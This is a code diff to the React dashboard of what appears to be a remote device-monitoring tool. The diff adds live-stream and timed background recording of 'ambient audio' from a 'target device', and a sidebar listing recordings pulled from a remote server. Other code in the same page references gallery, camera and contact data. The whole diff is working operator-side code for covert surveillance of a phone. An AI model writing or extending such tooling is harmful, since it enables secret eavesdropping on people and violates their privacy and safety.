@@ -277,7 +277,8 @@ export default function Home() {
     const [isVoiceRecording, setIsVoiceRecording] = useState(false);
     const [voiceRecDuration, setVoiceRecDuration] = useState(60); // seconds
     const [voiceRecProgress, setVoiceRecProgress] = useState({ current: 0, total: 0 });
-    const [voiceRecordings, setVoiceRecordings] = useState<{ url: string; duration: number; timestamp: number }[]>([]);
+    const [capturedVoice, setCapturedVoice] = useState<any[]>([]);
+    const [voiceMode, setVoiceMode] = useState<'live' | 'record'>('record');
     const [playingRecUrl, setPlayingRecUrl] = useState<string | null>(null);
     const voiceRecTimerRef = useRef<NodeJS.Timeout | null>(null);
     const isLiveAudioRef = useRef<boolean>(false);
@@ -848,7 +849,16 @@ export default function Home() {
             // Voice Recording Ready â€” device finished recording, server uploaded to R2
             socket.on("voice_recording_ready", (data: any) => {
                 if (data.url) {
-                    setVoiceRecordings(prev => [{ url: data.url, duration: data.duration || 0, timestamp: data.timestamp || Date.now() }, ...prev]);
+                    setCapturedVoice(prev => {
+                        const filtered = prev.filter(item => !item.isTemp);
+                        return [{
+                            id: `voice_${Date.now()}`,
+                            resource_type: 'audio',
+                            url: data.url,
+                            created_at: new Date(data.timestamp || Date.now()).toISOString(),
+                            duration: data.duration || 0
+                        }, ...filtered];
+                    });
                 }
                 setIsVoiceRecording(false);
                 setVoiceRecProgress({ current: 0, total: 0 });
@@ -862,6 +872,15 @@ export default function Home() {
             socket.on("voice_recording_progress", (data: any) => {
                 if (data.current !== undefined) {
                     setVoiceRecProgress({ current: data.current, total: data.total || 60 });
+                }
+                if (data.current >= (data.total || 60) && (data.total || 60) > 0) {
+                    setCapturedVoice(prev => [{
+                        id: `temp_voice_${Date.now()}`,
+                        resource_type: 'audio',
+                        url: 'loading',
+                        created_at: new Date().toISOString(),
+                        isTemp: true
+                    }, ...prev]);
                 }
             });
 
@@ -937,13 +956,32 @@ export default function Home() {
                     .finally(() => { isFetchingCamera = false; });
             };
 
+            let isFetchingVoice = false;
+            const fetchVoice = (loadPage = 1, targetDeviceId = localStorage.getItem('selectedDeviceId')) => {
+                if (isFetchingVoice) return;
+                isFetchingVoice = true;
+                const limit = 100;
+                const deviceQuery = targetDeviceId ? `&deviceId=${targetDeviceId}` : '';
+
+                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/voice?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
+                    .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
+                    .then((data) => {
+                        const items = data.items || (Array.isArray(data) ? data : []);
+                        setCapturedVoice(items);
+                    })
+                    .catch(e => console.error('[Voice] Fetch error:', e))
+                    .finally(() => { isFetchingVoice = false; });
+            };
+
             // Expose globally securely for the socket event
             (window as any).fetchGalleryData = fetchGallery;
             (window as any).fetchCameraData = fetchCamera;
+            (window as any).fetchVoiceData = fetchVoice;
 
             // Initial fetch
             fetchGallery();
             fetchCamera();
+            fetchVoice();
 
             return () => {
                 if (socket) {
@@ -1248,6 +1286,13 @@ export default function Home() {
             if (elapsed >= voiceRecDuration) {
                 clearInterval(voiceRecTimerRef.current!);
                 voiceRecTimerRef.current = null;
+                setCapturedVoice(prev => [{
+                    id: `temp_voice_${Date.now()}`,
+                    resource_type: 'audio',
+                    url: 'loading',
+                    created_at: new Date().toISOString(),
+                    isTemp: true
+                }, ...prev]);
             }
         }, 1000);
     }, [socket, selectedDeviceId, session, voiceRecDuration]);
@@ -1979,56 +2024,192 @@ END:VCARD`;
                 );
             case 'audio':
                 return (
-                    <div className="space-y-6 animate-in fade-in zoom-in-95 duration-300">
-                        <div>
-                            <h2 className="text-2xl font-bold tracking-tight flex items-center gap-2">
-                                <Mic className="text-purple-400" /> Audio Monitoring
-                            </h2>
-                            <p className="text-sm text-white/40">Live listen or record ambient audio from the device.</p>
-                        </div>
-                        
-                        <div className="max-w-3xl mx-auto bg-white/5 border border-white/10 rounded-3xl p-8 sm:p-16 text-center relative overflow-hidden shadow-neo-2xl">
-                            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-purple-500/10 blur-[100px] rounded-full pointer-events-none" />
+                    <div className="flex flex-col lg:flex-row gap-6 animate-in fade-in zoom-in-95 duration-300 h-full max-h-[85vh]">
+                        {/* Main Audio Controls Area */}
+                        <div className="flex-1 flex flex-col bg-white/5 border border-white/10 rounded-[2rem] overflow-hidden shadow-neo-2xl relative">
+                            {/* Header */}
+                            <div className="p-6 sm:p-8 pb-4 flex justify-between items-center relative z-10 border-b border-white/5">
+                                <div>
+                                    <h2 className="text-2xl font-bold tracking-tight flex items-center gap-2">
+                                        <Mic className="text-purple-400" /> Audio Monitoring
+                                    </h2>
+                                    <p className="text-sm text-white/40">Live listen or record ambient audio.</p>
+                                </div>
+                            </div>
                             
-                            <div className="relative z-10 flex flex-col items-center gap-10">
-                                <div className="relative">
-                                    {isLiveAudio && (
-                                        <>
-                                            <div className="absolute inset-[-40px] rounded-full border border-purple-500/20 animate-[ping_2s_ease-out_infinite]" />
-                                            <div className="absolute inset-[-20px] rounded-full border border-purple-500/40 animate-[ping_1.5s_ease-out_infinite]" />
-                                        </>
-                                    )}
-                                    <div className={`w-36 h-36 rounded-full flex items-center justify-center shadow-2xl transition-all duration-500 ${isLiveAudio ? 'bg-purple-500/20 text-purple-400 border-2 border-purple-500/50 shadow-[0_0_50px_rgba(168,85,247,0.3)]' : 'bg-white/5 text-white/30 border border-white/10 hover:bg-white/10 hover:text-white/60 cursor-pointer'}`} onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}>
-                                        <Mic size={56} strokeWidth={isLiveAudio ? 2 : 1.5} />
+                            {/* Mode Switcher */}
+                            <div className="flex p-4 gap-2 border-b border-white/5 bg-black/20">
+                                <button 
+                                    onClick={() => setVoiceMode('record')} 
+                                    className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all ${voiceMode === 'record' ? 'bg-purple-500 text-white shadow-[0_0_15px_rgba(168,85,247,0.3)]' : 'text-white/50 hover:bg-white/5'}`}
+                                >
+                                    Record Voice
+                                </button>
+                                <button 
+                                    onClick={() => setVoiceMode('live')} 
+                                    className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all ${voiceMode === 'live' ? 'bg-purple-500 text-white shadow-[0_0_15px_rgba(168,85,247,0.3)]' : 'text-white/50 hover:bg-white/5'}`}
+                                >
+                                    Live Stream
+                                </button>
+                            </div>
+
+                            <div className="flex-1 p-6 sm:p-8 flex flex-col items-center justify-center relative overflow-hidden">
+                                {voiceMode === 'live' ? (
+                                    <>
+                                        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-purple-500/10 blur-[100px] rounded-full pointer-events-none" />
+                                        
+                                        <div className="relative z-10 flex flex-col items-center gap-10">
+                                            <div className="relative">
+                                                {isLiveAudio && (
+                                                    <>
+                                                        <div className="absolute inset-[-40px] rounded-full border border-purple-500/20 animate-[ping_2s_ease-out_infinite]" />
+                                                        <div className="absolute inset-[-20px] rounded-full border border-purple-500/40 animate-[ping_1.5s_ease-out_infinite]" />
+                                                    </>
+                                                )}
+                                                <div className={`w-36 h-36 rounded-full flex items-center justify-center shadow-2xl transition-all duration-500 ${isLiveAudio ? 'bg-purple-500/20 text-purple-400 border-2 border-purple-500/50 shadow-[0_0_50px_rgba(168,85,247,0.3)]' : 'bg-white/5 text-white/30 border border-white/10 hover:bg-white/10 hover:text-white/60 cursor-pointer'}`} onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}>
+                                                    <Mic size={56} strokeWidth={isLiveAudio ? 2 : 1.5} />
+                                                </div>
+                                            </div>
+
+                                            <div>
+                                                <h3 className="text-2xl font-bold mb-3 text-center">{isLiveAudio ? 'Live Stream Active' : 'Microphone Standby'}</h3>
+                                                <p className="text-sm text-white/50 max-w-sm mx-auto leading-relaxed text-center">
+                                                    {isLiveAudio 
+                                                        ? 'Streaming real-time, low-latency audio directly from the device microphone to your browser.' 
+                                                        : 'Click to start a secure, low-latency live audio stream from the target device.'}
+                                                </p>
+                                                {isLiveAudio && (
+                                                    <div className="flex items-center justify-center gap-1.5 h-12 w-full mt-6 px-4">
+                                                        {Array.from({length: 24}).map((_, i) => (
+                                                            <div 
+                                                                key={i} 
+                                                                className="w-1.5 bg-purple-400 rounded-full transition-all duration-75"
+                                                                style={{ height: `${Math.max(15, audioLevel * 100 * Math.random())}%`, opacity: Math.max(0.3, audioLevel * Math.random() * 2) }}
+                                                            />
+                                                        ))}
+                                                    </div>
+                                                )}
+                                            </div>
+
+                                            <button 
+                                                onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}
+                                                className={`py-4 px-10 rounded-full font-bold text-sm tracking-widest transition-all ${isLiveAudio ? 'bg-red-500 hover:bg-red-600 text-white shadow-[0_0_30px_rgba(239,68,68,0.4)] hover:shadow-[0_0_40px_rgba(239,68,68,0.6)]' : 'bg-purple-500 hover:bg-purple-600 text-white shadow-[0_0_30px_rgba(168,85,247,0.4)] hover:shadow-[0_0_40px_rgba(168,85,247,0.6)]'}`}
+                                            >
+                                                {isLiveAudio ? 'STOP STREAM' : 'START LIVE AUDIO'}
+                                            </button>
+                                        </div>
+                                    </>
+                                ) : (
+                                    <>
+                                        {/* Recording UI */}
+                                        <div className="w-full max-w-md mx-auto space-y-8 flex flex-col items-center relative z-10">
+                                            {!isVoiceRecording ? (
+                                                <div className="flex gap-3 justify-center w-full">
+                                                    {[15, 30, 60].map((dur) => (
+                                                        <button
+                                                            key={dur}
+                                                            onClick={() => setVoiceRecDuration(dur)}
+                                                            className={`flex-1 py-3 rounded-2xl border transition-all font-bold ${voiceRecDuration === dur ? 'bg-purple-500/20 border-purple-500/50 text-purple-400' : 'bg-black/40 border-white/5 text-white/50 hover:bg-white/5'}`}
+                                                        >
+                                                            {dur}s
+                                                        </button>
+                                                    ))}
+                                                </div>
+                                            ) : (
+                                                <div className="w-full bg-black/40 border border-white/10 rounded-2xl p-4 flex flex-col gap-2">
+                                                    <div className="flex justify-between text-xs font-bold tracking-widest text-white/50">
+                                                        <span className="text-red-400 flex items-center gap-2"><div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" /> RECORDING</span>
+                                                        <span>{voiceRecProgress.current}s / {voiceRecDuration}s</span>
+                                                    </div>
+                                                    <div className="w-full h-2 bg-white/10 rounded-full overflow-hidden">
+                                                        <div 
+                                                            className="h-full bg-purple-500 transition-all duration-1000"
+                                                            style={{ width: `${(voiceRecProgress.current / voiceRecDuration) * 100}%` }}
+                                                        />
+                                                    </div>
+                                                </div>
+                                            )}
+
+                                            <div className="relative">
+                                                {isVoiceRecording && (
+                                                    <div className="absolute inset-[-20px] rounded-full border border-red-500/30 animate-[ping_2s_ease-out_infinite]" />
+                                                )}
+                                                <button 
+                                                    onClick={() => {
+                                                        const device = devices.find(d => d.deviceId === selectedDeviceId);
+                                                        if (!device?.online) {
+                                                            setAlertData({ title: 'Device Offline', message: 'Cannot record voice on an offline device.', type: 'error' });
+                                                            setShowCustomAlert(true);
+                                                            return;
+                                                        }
+                                                        if (isVoiceRecording) {
+                                                            stopVoiceRecording();
+                                                        } else {
+                                                            startVoiceRecording();
+                                                        }
+                                                    }}
+                                                    className={`w-32 h-32 rounded-full flex items-center justify-center border-[6px] shadow-2xl transition-all ${isVoiceRecording ? 'border-red-500 bg-red-500/20' : 'border-white bg-white/5 hover:bg-white/10'}`}
+                                                >
+                                                    <Mic size={40} className={isVoiceRecording ? "text-red-400 animate-pulse" : "text-white"} />
+                                                </button>
+                                            </div>
+                                            
+                                            <p className="text-sm text-white/40 max-w-xs text-center font-medium">
+                                                {isVoiceRecording ? 'Recording audio in background...' : 'Tap to start recording ambient audio.'}
+                                            </p>
+                                        </div>
+                                    </>
+                                )}
+                            </div>
+                        </div>
+
+                        {/* Recent Voice Media Sidebar */}
+                        <div className="w-full lg:w-80 flex flex-col bg-white/5 border border-white/10 rounded-[2rem] overflow-hidden shadow-neo-lg">
+                            <div className="p-5 border-b border-white/5 bg-black/20 flex flex-col gap-3">
+                                <div className="flex items-center gap-3">
+                                    <div className="w-10 h-10 rounded-xl bg-purple-500/10 flex items-center justify-center border border-purple-500/20">
+                                        <Mic size={20} className="text-purple-400" />
+                                    </div>
+                                    <div>
+                                        <h3 className="font-bold text-lg text-white/90 leading-tight">Voice Notes</h3>
+                                        <p className="text-[10px] text-purple-400 font-data tracking-widest uppercase">Recorded</p>
                                     </div>
                                 </div>
-
-                                <div>
-                                    <h3 className="text-2xl font-bold mb-3">{isLiveAudio ? 'Live Stream Active' : 'Microphone Standby'}</h3>
-                                    <p className="text-sm text-white/50 max-w-sm mx-auto leading-relaxed">
-                                        {isLiveAudio 
-                                            ? 'Streaming real-time, low-latency audio directly from the device microphone to your browser.' 
-                                            : 'Click to start a secure, low-latency live audio stream from the target device.'}
-                                    </p>
-                                    {isLiveAudio && (
-                                        <div className="flex items-center justify-center gap-1.5 h-12 w-full mt-6 px-4">
-                                            {Array.from({length: 24}).map((_, i) => (
-                                                <div 
-                                                    key={i} 
-                                                    className="w-1.5 bg-purple-400 rounded-full transition-all duration-75"
-                                                    style={{ height: `${Math.max(15, audioLevel * 100 * Math.random())}%`, opacity: Math.max(0.3, audioLevel * Math.random() * 2) }}
-                                                />
-                                            ))}
-                                        </div>
-                                    )}
-                                </div>
-
-                                <button 
-                                    onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}
-                                    className={`py-4 px-10 rounded-full font-bold text-sm tracking-widest transition-all ${isLiveAudio ? 'bg-red-500 hover:bg-red-600 text-white shadow-[0_0_30px_rgba(239,68,68,0.4)] hover:shadow-[0_0_40px_rgba(239,68,68,0.6)]' : 'bg-purple-500 hover:bg-purple-600 text-white shadow-[0_0_30px_rgba(168,85,247,0.4)] hover:shadow-[0_0_40px_rgba(168,85,247,0.6)]'}`}
-                                >
-                                    {isLiveAudio ? 'STOP STREAM' : 'START LIVE AUDIO'}
-                                </button>
+                            </div>
+                            <div className="flex-1 overflow-y-auto custom-scrollbar p-4 flex flex-col gap-3">
+                                {capturedVoice.length === 0 && (
+                                    <div className="w-full flex flex-col items-center justify-center text-white/30 text-center gap-3 p-4 min-h-[200px] bg-white/5 rounded-2xl border border-white/5 border-dashed mt-2">
+                                        <Mic size={40} strokeWidth={1} />
+                                        <p className="text-xs font-medium">No voice notes.<br/>Record some ambient audio!</p>
+                                    </div>
+                                )}
+                                {capturedVoice.map((audio: any) => (
+                                    <div key={audio.id} className="w-full bg-black/40 border border-white/5 hover:border-purple-500/50 rounded-xl p-4 flex flex-col gap-3 transition-all hover:shadow-[0_0_15px_rgba(168,85,247,0.15)] group">
+                                        {audio.isTemp ? (
+                                            <div className="w-full flex items-center justify-center py-4 text-purple-400 gap-2">
+                                                <RefreshCw className="w-5 h-5 animate-spin" />
+                                                <span className="text-xs font-bold uppercase tracking-widest">Saving...</span>
+                                            </div>
+                                        ) : (
+                                            <>
+                                                <div className="flex items-center justify-between">
+                                                    <div className="flex items-center gap-2">
+                                                        <div className="w-8 h-8 rounded-full bg-purple-500/20 flex items-center justify-center text-purple-400">
+                                                            <Mic size={14} />
+                                                        </div>
+                                                        <div className="flex flex-col">
+                                                            <span className="text-xs font-bold text-white/80">Voice Note</span>
+                                                            <span className="text-[10px] text-white/40">{new Date(audio.created_at).toLocaleString()}</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div className="w-full">
+                                                    <audio src={audio.url} controls className="w-full h-8 outline-none grayscale invert opacity-70 group-hover:opacity-100 transition-opacity" />
+                                                </div>
+                                            </>
+                                        )}
+                                    </div>
+                                ))}
                             </div>
                         </div>
                     </div>
